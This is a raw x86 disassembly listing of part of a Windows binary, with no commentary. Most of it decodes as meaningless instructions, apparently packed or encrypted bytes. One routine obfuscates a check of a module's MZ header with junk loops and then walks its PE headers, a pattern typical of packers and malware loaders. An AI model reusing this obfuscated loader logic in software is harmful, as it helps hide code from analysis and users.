  41017c:	add    ecx,DWORD PTR [esi+ebp*2+0x64]
  410180:	cli    
  410181:	inc    esp
  410182:	iret   
  410183:	shl    BYTE PTR [ebp+0x22],cl
  410186:	jae    0x4101f5
  410188:	adc    BYTE PTR [eax],dl
  41018a:	cs inc eax
  41018c:	pop    edx
  41018d:	sub    ebx,ecx
  41018f:	adc    eax,0xc4c5f175
  410194:	push   es
  410195:	sbb    eax,0x738c9d1d
  41019a:	mov    es,esi
  41019c:	mov    edi,0xc033b06d
  4101a1:	inc    esp
  4101a2:	jns    0x41012b
  4101a4:	xor    BYTE PTR [esi],0x61
  4101a7:	mov    ?,WORD PTR [edi]
  4101a9:	sub    BYTE PTR [ebx+0x7f8af0c5],0x7d
  4101b0:	repz in eax,0x23
  4101b3:	test   eax,0x1aae78e7
  4101b8:	and    BYTE PTR [edi-0x2],0x75
  4101bc:	sub    dl,bh
  4101be:	pusha  
  4101bf:	xor    esp,edx
  4101c1:	mov    WORD PTR [ecx+0x2d091dbf],?
  4101c7:	add    ecx,eax
  4101c9:	push   0x1108f3ea
  4101ce:	pop    ebp
  4101cf:	mov    bp,0x7cfe
  4101d3:	push   edx
  4101d4:	sidtd  [edi]
  4101d7:	call   0x500:0xb5b0adfd
  4101de:	xchg   edx,eax
  4101df:	push   edx
  4101e0:	mov    bl,0x61
  4101e2:	jg     0x410238
  4101e4:	cdq    
  4101e5:	and    DWORD PTR [edi],0x68cbd23d
  4101eb:	add    BYTE PTR [ebx+0x7],dh
  4101ee:	push   ebp
  4101ef:	sub    cl,BYTE PTR [ecx]
  4101f1:	push   0xd7537e26
  4101f6:	retf   
  4101f7:	mov    fs,esi
  4101f9:	inc    ecx
  4101fa:	cs ins DWORD PTR es:[edi],dx
  4101fc:	addr16 lock jae 0x410209
  410200:	ss fwait
  410202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410203:	adc    BYTE PTR [ecx-0x1af37490],bl
  410209:	pop    ds
  41020a:	push   eax
  41020b:	leave  
  41020c:	mov    al,ds:0xb466f0bb
  410211:	sbb    BYTE PTR [edx],ch
  410213:	sahf   
  410214:	popf   
  410215:	pop    edx
  410216:	pop    eax
  410217:	push   edx
  410218:	dec    edi
  410219:	in     eax,0x65
  41021b:	inc    esi
  41021c:	adc    al,0xb8
  41021e:	inc    eax
  41021f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410220:	ret    0xc8dd
  410223:	fwait
  410224:	out    dx,al
  410225:	add    edi,DWORD PTR [edx+edi*4]
  410228:	push   cs
  410229:	inc    ebp
  41022a:	xchg   edi,eax
  41022b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41022c:	inc    edx
  41022d:	lahf   
  41022e:	dec    edi
  41022f:	adc    BYTE PTR [edi-0x65817de7],ch
  410235:	dec    esi
  410236:	test   DWORD PTR [edx+edi*2+0x36],ebx
  41023a:	dec    eax
  41023b:	out    0x5f,al
  41023d:	pop    ss
  41023e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41023f:	loop   0x410204
  410241:	shl    DWORD PTR [ebp+ebx*1+0x2c],cl
  410245:	les    edi,FWORD PTR ds:0x4f25c4ff
  41024b:	leave  
  41024c:	mov    BYTE PTR [ebx+0x7e],0x18
  410250:	or     al,0x88
  410252:	icebp  
  410253:	xor    DWORD PTR [ecx],ecx
  410255:	punpcklbw mm7,DWORD PTR [esi]
  410258:	mov    al,ah
  41025a:	out    dx,al
  41025b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41025c:	inc    eax
  41025d:	mov    dh,bl
  41025f:	push   0xe669a83a
  410264:	leave  
  410265:	xlat   BYTE PTR ds:[ebx]
  410266:	inc    ebp
  410267:	sbb    DWORD PTR [eax-0x77],eax
  41026a:	es pusha 
  41026c:	add    bl,BYTE PTR [eax]
  41026e:	daa    
  41026f:	mov    cl,0x8b
  410271:	dec    edi
  410272:	inc    ebx
  410273:	xor    esi,DWORD PTR [ecx-0x28ae4d99]
  410279:	outs   dx,DWORD PTR ds:[esi]
  41027a:	test   eax,0x372f609d
  41027f:	xlat   BYTE PTR ds:[ebx]
  410280:	ficomp DWORD PTR [ecx+0x673c246f]
  410286:	mov    esi,0x4f6dab22
  41028b:	int3   
  41028c:	(bad)  
  41028d:	xchg   edi,eax
  41028e:	pop    ebx
  41028f:	das    
  410290:	out    0x7f,al
  410292:	or     dl,BYTE PTR [ebx+0x402dec7f]
  410298:	int    0x92
  41029a:	aaa    
  41029b:	mov    ecx,0x1352224c
  4102a0:	rcl    DWORD PTR [ecx+0x76],1
  4102a3:	scas   al,BYTE PTR es:[edi]
  4102a4:	mov    eax,ds:0x12c3e7e
  4102a9:	dec    ebp
  4102aa:	(bad)  
  4102ab:	outs   dx,DWORD PTR ds:[esi]
  4102ac:	lods   eax,DWORD PTR ds:[esi]
  4102ad:	(bad)  
  4102ae:	dec    ebx
  4102af:	lahf   
  4102b0:	fwait
  4102b1:	xor    BYTE PTR [ebp+0x16f5a414],ch
  4102b7:	push   ds
  4102b8:	ficom  WORD PTR [ebx]
  4102ba:	jmp    0x410336
  4102bc:	xchg   DWORD PTR [ecx+0x2da02a4b],ebp
  4102c2:	sbb    eax,DWORD PTR ds:0x79dad69c
  4102c8:	xchg   ecx,eax
  4102c9:	push   edx
  4102ca:	fadd   DWORD PTR [edi+0x37]
  4102cd:	inc    esp
  4102ce:	mov    BYTE PTR [ebp-0x6b],ah
  4102d1:	xor    bl,ch
  4102d3:	mov    ch,0xa4
  4102d5:	dec    esi
  4102d6:	es loopne 0x41026a
  4102d9:	js     0x41032f
  4102db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102dc:	lds    esp,FWORD PTR [esi+0x68183030]
  4102e2:	fsub   st,st(7)
  4102e4:	ins    BYTE PTR es:[edi],dx
  4102e5:	lahf   
  4102e6:	sub    eax,0x168b2306
  4102eb:	and    DWORD PTR [esp+edi*4],ebp
  4102ee:	js     0x410276
  4102f0:	push   edi
  4102f1:	or     BYTE PTR [esi],ah
  4102f3:	xchg   edx,eax
  4102f4:	or     ebp,DWORD PTR [ecx-0x24]
  4102f7:	ficom  DWORD PTR [edx]
  4102f9:	leave  
  4102fa:	push   ss
  4102fb:	clc    
  4102fc:	push   ecx
  4102fd:	sbb    al,0x46
  4102ff:	stc    
  410300:	sbb    al,0xc
  410302:	mov    edx,0x8f6ac81b
  410307:	xor    ecx,DWORD PTR [edi-0x51fc0616]
  41030d:	stos   DWORD PTR es:[edi],eax
  41030e:	sbb    edi,DWORD PTR [eax]
  410310:	fst    QWORD PTR [esi-0x2c939ed8]
  410316:	rol    BYTE PTR [esi+ecx*8-0x3ee4b159],0x16
  41031e:	xchg   BYTE PTR ds:0xb826eae2,ch
  410324:	inc    edx
  410325:	xor    BYTE PTR [edx-0x355c56f1],bl
  41032b:	and    al,0xc9
  41032d:	out    0xfd,al
  41032f:	dec    ebp
  410330:	fnstenv [edi+0x70b0f835]
  410336:	mov    dh,0x44
  410338:	repz pop ds
  41033a:	out    0x26,eax
  41033c:	jae    0x41032f
  41033e:	daa    
  41033f:	jge    0x41039c
  410341:	mov    ah,0x87
  410343:	rol    BYTE PTR [ebx-0x13389ac7],1
  410349:	nop
  41034a:	cmp    al,BYTE PTR [edi+0x3d]
  41034d:	addr16 cwde 
  41034f:	mov    ch,0xc5
  410351:	xor    dh,BYTE PTR [ecx-0x5d3cabde]
  410357:	cmp    BYTE PTR [ecx],al
  410359:	sbb    BYTE PTR ds:0x111d89d5,bl
  41035f:	pop    edx
  410360:	loope  0x410306
  410362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410363:	les    edi,FWORD PTR [eax]
  410365:	adc    eax,0xa0acbfe6
  41036a:	sub    al,0x73
  41036c:	ja     0x4103e5
  41036e:	loop   0x4102f2
  410370:	xlat   BYTE PTR ds:[ebx]
  410371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410372:	or     cl,ch
  410374:	mov    al,0x9d
  410376:	aas    
  410377:	push   ebx
  410378:	je     0x4103e2
  41037a:	mov    ch,0xac
  41037c:	loope  0x410300
  41037e:	xchg   ebp,eax
  41037f:	test   DWORD PTR [ebx-0x1c],ebx
  410382:	cli    
  410383:	inc    esp
  410384:	adc    eax,eax
  410386:	adc    edi,eax
  410388:	daa    
  410389:	adc    al,0x86
  41038b:	push   es
  41038c:	jns    0x4103c0
  41038e:	xchg   ebp,eax
  41038f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410390:	sbb    DWORD PTR [ecx-0x3b],esp
  410393:	xlat   BYTE PTR ds:[ebx]
  410394:	lods   eax,DWORD PTR ds:[esi]
  410395:	adc    al,BYTE PTR [esi-0x58]
  410398:	mov    esp,0x597689f4
  41039d:	fiadd  WORD PTR [edx+0x182eab30]
  4103a3:	adc    eax,0xbedfa0b0
  4103a8:	and    al,0x7c
  4103aa:	push   eax
  4103ab:	out    0xbf,al
  4103ad:	in     ax,dx
  4103af:	(bad)  
  4103b1:	test   al,0xaa
  4103b3:	lods   al,BYTE PTR ds:[esi]
  4103b4:	and    edx,DWORD PTR [ebp-0x7e]
  4103b7:	cmp    DWORD PTR [ebp+eax*4-0x2419f834],ebx
  4103be:	fdiv   QWORD PTR [ebp-0x25]
  4103c1:	pop    edx
  4103c2:	std    
  4103c3:	push   cs
  4103c4:	dec    edx
  4103c5:	rcl    DWORD PTR [ebx+0x8e42f9d],cl
  4103cb:	inc    ebx
  4103cc:	mov    eax,ds:0x98809108
  4103d1:	icebp  
  4103d2:	aaa    
  4103d3:	popa   
  4103d4:	ror    BYTE PTR [ebx],0xea
  4103d7:	test   al,0x8b
  4103d9:	ss inc edi
  4103db:	sbb    al,ah
  4103dd:	cmp    eax,0xa63c87b1
  4103e2:	sar    DWORD PTR [esi-0x78],1
  4103e5:	ins    BYTE PTR es:[edi],dx
  4103e6:	jnp    0x41040c
  4103e8:	arpl   WORD PTR [edi],di
  4103ea:	and    DWORD PTR [edx],0x6e
  4103ed:	fstp   DWORD PTR [ebp+0x5af8fb76]
  4103f3:	sahf   
  4103f4:	arpl   sp,si
  4103f6:	jo     0x410424
  4103f8:	mov    dl,0x56
  4103fa:	inc    ebx
  4103fb:	xchg   ebx,eax
  4103fc:	jp     0x4103aa
  4103fe:	or     eax,0xa7578f96
  410403:	mov    ebx,?
  410405:	add    BYTE PTR [ecx+0x7423763],cl
  41040b:	push   ebx
  41040c:	push   ebp
  41040d:	repz adc ecx,esi
  410410:	sub    DWORD PTR [edx-0xf],esp
  410413:	xor    esi,DWORD PTR [ebx-0x5ad4c3ec]
  410419:	xchg   edi,eax
  41041a:	jp     0x41046d
  41041c:	ret    
  41041d:	cdq    
  41041e:	scas   eax,DWORD PTR es:[edi]
  41041f:	sub    dh,BYTE PTR [esi-0x660c1c5c]
  410425:	xor    ah,ch
  410427:	sbb    eax,0x2002acfd
  41042c:	icebp  
  41042d:	inc    esp
  41042e:	aam    0xc6
  410430:	sub    dl,BYTE PTR [edi+ecx*2]
  410433:	xchg   DWORD PTR [ecx],edi
  410435:	test   eax,0xcd5d88e5
  41043a:	or     dl,cl
  41043c:	jbe    0x410458
  41043e:	rcr    edi,1
  410440:	jmp    0x4103ef
  410442:	xchg   edi,eax
  410443:	mov    ebp,0x5f849c7c
  410448:	pop    esi
  410449:	setns  bh
  41044c:	jne    0x4104ca
  41044e:	jo     0x410413
  410450:	xchg   edx,eax
  410451:	mov    WORD PTR [edi-0x71acbc01],?
  410457:	fisubr WORD PTR [ebx+0x25]
  41045a:	inc    ebp
  41045b:	inc    esp
  41045c:	xor    al,0xcd
  41045e:	hlt    
  41045f:	cdq    
  410460:	retf   
  410461:	jmp    0x32da76e1
  410466:	mov    ebx,0x2203c69f
  41046b:	sbb    BYTE PTR [ecx-0x166af642],ch
  410471:	pusha  
  410472:	dec    esp
  410473:	sbb    DWORD PTR [ecx-0x72],ebp
  410476:	push   esp
  410477:	idiv   DWORD PTR [edi-0x5f]
  41047a:	pop    eax
  41047b:	inc    esi
  41047c:	xchg   edi,eax
  41047d:	pop    ebp
  41047e:	popf   
  41047f:	sar    DWORD PTR [ebx-0x5c06e9f2],1
  410485:	out    dx,al
  410486:	lods   al,BYTE PTR ds:[esi]
  410487:	mov    edx,0x9fb69d54
  41048c:	or     al,0x6a
  41048e:	fwait
  41048f:	icebp  
  410490:	shr    BYTE PTR [eax+0x4c],1
  410493:	mov    esi,DWORD PTR [edi+0xc]
  410496:	test   al,0x61
  410498:	pop    edx
  410499:	xchg   BYTE PTR [edx+0x6d],al
  41049c:	test   BYTE PTR [ebx],dl
  41049e:	pop    ecx
  41049f:	ds dec ebp
  4104a1:	dec    ecx
  4104a2:	sub    bl,BYTE PTR [edi+esi*2]
  4104a5:	gs mov esp,0x57065ea8
  4104ab:	inc    esp
  4104ac:	ins    BYTE PTR es:[edi],dx
  4104ad:	dec    ecx
  4104ae:	xlat   BYTE PTR ds:[ebx]
  4104af:	ja     0x4104b7
  4104b1:	cli    
  4104b2:	mov    ebp,?
  4104b4:	cmp    BYTE PTR [edi+0x5ec603d6],dh
  4104ba:	leave  
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x434677,0x1f
  4104d3:	cmp    DWORD PTR ds:0x434677,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x434677,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x434677,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x434677
  410508:	dec    eax
  410509:	mov    ds:0x434677,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x434677
  410516:	dec    eax
  410517:	mov    ds:0x434677,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x4346c7,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43470f,0x434793
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x4346cf,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434707
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x43466b,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x43466b
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x43466b,edx
  410571:	cmp    DWORD PTR ds:0x43466b,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x43466b,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x43466b,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x43466b
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x43466b,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	push   ebx
  4105ed:	repz pause 
  4105f0:	test   BYTE PTR [edi+0x7e],0x7e
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x410638
  4105f9:	adc    dh,dh
  4105fb:	pop    ss
  4105fc:	mov    edi,0x8a6ae3eb
  410601:	cmp    edx,edi
  410603:	jecxz  0x4105a5
  410605:	in     al,dx
  410606:	and    al,0x3e
  410608:	or     BYTE PTR [edi+0x537de6a2],bl
  41060e:	ins    BYTE PTR es:[edi],dx
  41060f:	ret    
  410610:	cdq    
  410611:	cmp    al,BYTE PTR [edi+0x465fea26]
  410617:	adc    BYTE PTR [ecx-0x7261d0b],bh
  41061d:	cwde   
  41061e:	mov    ah,0xa0
  410620:	retfw  0xf7b4
  410624:	pop    ss
  410625:	adc    al,0x55
  410627:	cdq    
  410628:	push   edi
  410629:	xchg   DWORD PTR [edi],ecx
  41062b:	daa    
  41062c:	sahf   
  41062d:	inc    eax
  41062e:	dec    esp
  41062f:	dec    edx
  410630:	jne    0x4105cb
  410632:	or     BYTE PTR [edx-0x687f2d01],0xa6
  410639:	outs   dx,DWORD PTR ds:[esi]
  41063a:	mov    edx,0xe9ff0bb9
  41063f:	aas    
  410640:	in     al,0x13
  410642:	jge    0x4105df
  410644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410645:	adc    al,0x2a
  410647:	mov    dx,WORD PTR gs:[ebx+edx*8-0x10ca21fe]
  410650:	das    
  410651:	fisubr DWORD PTR [esp+esi*8+0x59]
  410655:	xor    eax,DWORD PTR [ebx-0x48]
  410658:	mul    DWORD PTR [edi+eax*8]
  41065b:	push   cs
  41065c:	xchg   ebx,eax
  41065d:	nop
  41065e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41065f:	mov    al,0x80
  410661:	cmc    
  410662:	in     eax,dx
  410663:	add    DWORD PTR fs:[edx+0x51fd161a],ebx
  41066a:	rcl    DWORD PTR [ecx-0x6ebe9024],1
  410670:	xor    al,0xe9
  410672:	fcom   QWORD PTR [ebp+0x40f0a4]
  410678:	mov    cl,0xab
  41067a:	jle    0x410694
  41067c:	stc    
  41067d:	sar    DWORD PTR ds:0x9001a6d1,1
  410683:	jmp    0xee8530cd
  410688:	out    dx,eax
  410689:	adc    dh,0x8
  41068c:	ds div edx
  41068f:	and    eax,0x48ffbcdc
  410694:	push   ebx
  410695:	sub    ebx,0xf3fceede
  41069b:	cmc    
  41069c:	sub    ebx,edi
  41069e:	shl    edx,cl
  4106a0:	or     ecx,edx
  4106a2:	xchg   ebp,esi
  4106a4:	popf   
  4106a5:	mov    cl,0x4a
  4106a7:	inc    esi
  4106a8:	sti    
  4106a9:	mov    bl,0x43
  4106ab:	(bad)  
  4106ac:	call   0x3bbc47b7
  4106b1:	or     ah,BYTE PTR [ebx]
  4106b3:	shr    BYTE PTR [eax-0x2b],0x11
  4106b7:	popa   
  4106b8:	int3   
  4106b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106ba:	and    BYTE PTR [esi],ah
  4106bc:	mov    ebp,0x5de65095
  4106c1:	ins    DWORD PTR es:[edi],dx
  4106c2:	xor    dh,BYTE PTR [esi-0x60]
  4106c5:	lea    ebx,[ebp+0x3b]
  4106c8:	cwde   
  4106c9:	mov    al,dl
  4106cb:	push   ebp
  4106cc:	div    DWORD PTR [ebp+0x70]
  4106cf:	adc    DWORD PTR [edx],edx
  4106d1:	jae    0x410720
  4106d3:	aas    
  4106d4:	les    esp,FWORD PTR [ecx]
  4106d6:	aad    0x19
  4106d8:	cdq    
  4106d9:	push   esi
  4106da:	adc    al,0x56
  4106dc:	cmp    al,0xd7
  4106de:	aas    
  4106df:	mov    edx,0x286648df
  4106e4:	add    cl,ah
  4106e6:	jae    0x4106d2
  4106e8:	mov    ebp,0x2ac10846
  4106ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106ee:	iret   
  4106ef:	mov    ?,WORD PTR [edi+0x76]
  4106f2:	xor    ah,BYTE PTR [esi]
  4106f4:	(bad)  
  4106f5:	sub    BYTE PTR [eax+0x6f],bl
  4106f8:	mov    fs,WORD PTR [esi+eiz*4]
  4106fb:	mul    BYTE PTR [ebx-0x4398cfa3]
  410701:	es add al,0x8a
  410704:	sub    eax,0x54617e17
  410709:	mov    es,ebx
  41070b:	adc    esp,ecx
  41070d:	xchg   edi,eax
  41070e:	or     bh,BYTE PTR [ebx-0x351120a8]
  410714:	and    ebp,esi
  410716:	ja     0x410730
  410718:	test   eax,0x3e45a4af
  41071d:	mov    ecx,ebp
  41071f:	or     eax,eax
  410721:	xlat   BYTE PTR ds:[ebx]
  410722:	fisubr DWORD PTR [ecx]
  410724:	mov    ah,0x46
  410726:	test   BYTE PTR [esi+0x23],cl
  410729:	in     al,0x34
  41072b:	loop   0x4106b4
  41072d:	int3   
  41072e:	sbb    al,0xb
  410730:	ins    BYTE PTR es:[edi],dx
  410731:	mov    ecx,eax
  410733:	and    ebp,DWORD PTR [eax+esi*4-0x3762c71f]
  41073a:	adc    al,BYTE PTR [ebp+0x11]
  41073d:	loop   0x410743
  41073f:	mov    ds:0xf8f32ed6,al
  410744:	stos   DWORD PTR es:[edi],eax
  410745:	das    
  410746:	inc    esp
  410747:	call   0x7a3497e3
  41074c:	adc    al,0xcc
  41074e:	shr    eax,1
  410750:	dec    edi
  410751:	add    esp,DWORD PTR [edi-0x5b]
  410754:	call   0xc8f5d699
  410759:	addr16 sbb al,0x4
  41075c:	mov    DWORD PTR [ebx],eax
  41075e:	je     0x410770
  410760:	or     DWORD PTR [edx+edi*1],esp
  410763:	dec    ecx
  410764:	push   ss
  410765:	pop    ebx
  410766:	pop    edx
  410767:	dec    esp
  410768:	in     al,0x40
  41076a:	imul   esp,DWORD PTR [ebx],0xd5d83129
  410770:	fs shr ah,cl
  410773:	test   DWORD PTR [edx-0x23],esi
  410776:	adc    DWORD PTR [eax-0x2d],0xffffffeb
  41077a:	shr    DWORD PTR [ebx-0x78],0xd0
  41077e:	xchg   BYTE PTR ds:0x5280ab1b,cl
  410784:	dec    ebp
  410785:	mov    dl,0x5
  410787:	mov    WORD PTR [esi],ds
  410789:	fsub   DWORD PTR [eax]
  41078b:	jbe    0x4107d2
  41078d:	jecxz  0x410747
  41078f:	jl     0x4107b7
  410791:	test   BYTE PTR [edi+edx*1+0x23],ch
  410795:	jo     0x410722
  410797:	jne    0x4107a1
  410799:	mov    ecx,0x327299
  41079e:	jmp    0x410959
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	mov    BYTE PTR [ecx],al
  4107b1:	scas   eax,DWORD PTR es:[edi]
  4107b2:	jbe    0x4107c8
  4107b4:	inc    ecx
  4107b5:	jle    0x410835
  4107b7:	pushf  
  4107b8:	jg     0x410838
  4107ba:	jle    0x410763
  4107bc:	mov    ch,0xe2
  4107be:	sub    al,0xa4
  4107c0:	inc    edi
  4107c1:	nop
  4107c2:	jmp    0xe3ce:0x3ac9b203
  4107c9:	xchg   edx,eax
  4107ca:	stc    
  4107cb:	add    bh,BYTE PTR [edi]
  4107cd:	(bad)  
  4107ce:	cwde   
  4107cf:	xchg   DWORD PTR ds:0x8368ec7a,ecx
  4107d5:	jno    0x4107df
  4107d7:	rcl    DWORD PTR [ecx],cl
  4107d9:	test   eax,0x7fbcf794
  4107de:	ins    BYTE PTR es:[edi],dx
  4107df:	push   cs
  4107e0:	xor    ecx,esp
  4107e2:	aas    
  4107e3:	ds xchg edx,eax
  4107e5:	popf   
  4107e6:	jle    0x410815
  4107e8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4107ea:	icebp  
  4107eb:	mov    eax,DWORD PTR [ebx]
  4107ed:	and    al,BYTE PTR [esi+0x2c49d2c8]
  4107f3:	in     eax,0x9c
  4107f5:	sbb    BYTE PTR [edx],dh
  4107f7:	shl    DWORD PTR [ebx-0x74],0x4e
  4107fb:	push   edx
  4107fc:	cld    
  4107fd:	int3   
  4107fe:	xchg   ecx,eax
  4107ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410800:	pop    ds
  410801:	push   ecx
  410802:	cmp    DWORD PTR [esi+0x5],edx
  410805:	push   ss
  410806:	or     edi,DWORD PTR [edi-0x3]
  410809:	sub    DWORD PTR [ebx-0x31],ebp
  41080c:	in     eax,dx
  41080d:	mov    dh,0x8c
  41080f:	push   ss
  410810:	or     eax,0xc3543778
  410815:	sub    DWORD PTR [eax+edi*4],esi
  410818:	lock xor ebx,edi
  41081b:	loopne 0x410887
  41081d:	stos   DWORD PTR es:[edi],eax
  41081e:	ss leave 
  410820:	addr16 mov ebx,eax
  410823:	and    dh,BYTE PTR [eax+0x14]
  410826:	hlt    
  410827:	cmp    eax,0xc6be93f
  41082c:	cwde   
  41082d:	hlt    
  41082e:	push   ds
  41082f:	xor    eax,0x93f4eb5c
  410834:	sub    eax,edi
  410836:	mov    dl,0x5a
  410838:	(bad)  
  410839:	es push ebx
  41083b:	fisttp WORD PTR [edi-0x41]
  41083e:	mov    ebx,0x5be218a0
  410843:	in     eax,dx
  410844:	mov    ds:0x4f61f570,al
  410849:	sbb    dl,BYTE PTR [ebx+0x311df7c2]
  41084f:	xchg   BYTE PTR [edi],al
  410851:	fstp   TBYTE PTR [ecx-0x2a]
  410854:	int    0x7c
  410856:	adc    al,0x42
  410858:	(bad)  
  410859:	into   
  41085a:	aas    
  41085b:	add    dh,bl
  41085d:	call   0x31d1:0x74da3072
  410864:	sub    eax,0x4af7e352
  410869:	xor    eax,ebx
  41086b:	pushf  
  41086c:	jl     0x410828
  41086e:	xor    edx,edx
  410870:	mov    BYTE PTR [esi+0x1794e41a],0xc7
  410877:	or     bl,BYTE PTR [eax]
  410879:	add    DWORD PTR [esi+0x732ee819],ebp
  41087f:	inc    edx
  410880:	and    BYTE PTR [esi+0x4a],dl
  410883:	push   cs
  410884:	pop    edi
  410885:	cmp    eax,0x1e5858ac
  41088a:	dec    esi
  41088b:	dec    eax
  41088c:	xor    bl,0x19
  41088f:	lods   al,BYTE PTR ds:[esi]
  410890:	pusha  
  410891:	or     DWORD PTR [eax],ebp
  410893:	pop    eax
  410894:	xchg   edx,eax
  410895:	ror    BYTE PTR [esi-0x4b24d1e4],1
  41089b:	loope  0x41090e
  41089d:	fwait
  41089e:	call   FWORD PTR [ebp-0x6a]
  4108a1:	add    BYTE PTR [esi],cl
  4108a3:	add    ebx,DWORD PTR ss:0x8b436795
  4108aa:	dec    esi
  4108ab:	cmp    BYTE PTR ds:0xff06a693,dh
  4108b1:	retf   0x9888
  4108b4:	repz pushf 
  4108b6:	add    cl,BYTE PTR [eax+0x3bf3c74b]
  4108bc:	addr16 pop ebp
  4108be:	into   
  4108bf:	loope  0x410891
  4108c1:	loop   0x410871
  4108c3:	lds    ecx,FWORD PTR [edi]
  4108c5:	cwde   
  4108c6:	(bad)  
  4108c9:	les    ecx,FWORD PTR [esp+eiz*2+0x1f7c7714]
  4108d0:	jg     0x410871
  4108d2:	outs   dx,DWORD PTR ds:[esi]
  4108d3:	retf   
  4108d4:	sbb    al,0xdc
  4108d6:	sbb    al,0x43
  4108d8:	ins    DWORD PTR es:[edi],dx
  4108d9:	or     eax,0x1faffc42
  4108de:	retf   0xd01f
  4108e1:	xchg   DWORD PTR ds:0xcd02e3bb,ebp
  4108e7:	loope  0x4108f7
  4108e9:	xchg   edi,eax
  4108ea:	xchg   DWORD PTR [edx-0x6f],ebx
  4108ed:	in     al,dx
  4108ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108ef:	sbb    bh,ah
  4108f1:	sbb    al,0x3b
  4108f3:	in     al,0x4a
  4108f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108f6:	adc    eax,0xf9afd27d
  4108fb:	out    0x49,al
  4108fd:	mul    eax
  4108ff:	out    0xb6,eax
  410901:	or     al,0x6
  410903:	mov    edx,0x99d1f7e6
  410908:	dec    edi
  410909:	pop    edx
  41090a:	je     0x41092a
  41090c:	adc    eax,0xf51be5d0
  410911:	adc    ch,cl
  410913:	mov    ?,WORD PTR [edi-0x5c]
  410916:	lock std 
  410918:	repz js 0x4108bc
  41091b:	test   eax,0xf56a17ff
  410920:	cs and ebx,esp
  410923:	fs and al,ch
  410926:	adc    bh,bl
  410928:	adc    al,0x89
  41092a:	sub    BYTE PTR [eax-0x6afe44fc],cl
  410930:	mov    ds:0x20460c0f,al
  410935:	(bad)  
  410936:	push   0xfd61a683
  41093b:	sub    DWORD PTR [ecx+0x29dbf429],esp
  410941:	enter  0xfd86,0x92
  410945:	je     0x410953
  410947:	inc    ecx
  410948:	jmp    0x4109b1
  41094a:	jbe    0x4109be
  41094c:	xor    eax,0x52b6832b
  410951:	add    ebx,DWORD PTR [esi]
  410953:	pop    eax
  410954:	test   eax,0xc714fc18
  410959:	add    eax,ecx
  41095b:	cmp    DWORD PTR [esi+0x54],eax
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
